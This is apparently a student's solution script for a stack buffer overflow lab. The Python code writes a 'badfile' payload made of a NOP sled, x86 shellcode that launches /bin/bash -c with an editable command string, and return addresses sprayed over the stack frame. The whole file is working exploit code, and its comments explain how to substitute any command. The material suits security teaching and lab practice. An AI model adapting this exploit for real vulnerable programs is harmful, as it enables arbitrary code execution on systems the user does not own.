#!/usr/bin/python3
import sys

shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "cd ../; ls; echo Successfully exploited!                  *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Configuration
ebp = 0xffffd4e8
buffer = 0xffffd454

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode at the end of the payload
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# The desirable return address should be somewhere before the start of the shellcode, 
# and needs to fall right at a NOP sled. 
# For now, letâ€™s define the return address as 10 bytes before our shellcode. 
ret = buffer + (517 - len(shellcode) - 10)

# The offset (i.e., the possible locations of the return address bucket on the stack) 
# should be somewhere after the ebp. 
# Instead of making a guess, I filled the entire buffer and its 20 bytes after 
# with the defined return address. 
# One of that will surely fall into the return address bucket of the stack.
for i in range (0, ebp-buffer+20):
  if i%4 == 0:
    content[i:i + 4] = (ret).to_bytes(4, byteorder='little') 

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)